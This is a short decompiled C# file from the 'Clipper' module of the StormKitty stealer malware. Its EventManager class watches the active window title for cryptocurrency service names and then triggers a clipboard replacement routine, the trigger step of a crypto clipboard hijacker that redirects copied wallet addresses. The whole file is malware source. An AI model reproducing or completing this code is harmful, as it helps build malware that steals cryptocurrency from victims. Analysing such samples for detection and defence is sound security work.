using System;
using StormKitty;

namespace Clipper
{
	// Token: 0x02000040 RID: 64
	internal sealed class EventManager
	{
		// Token: 0x06000113 RID: 275 RVA: 0x00008F10 File Offset: 0x00007110
		public static void Action()
		{
			if (EventManager.Detect())
			{
				Clipper.Replace();
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00008F20 File Offset: 0x00007120
		private static bool Detect()
		{
			foreach (string value in Config.CryptoServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}
	}
}
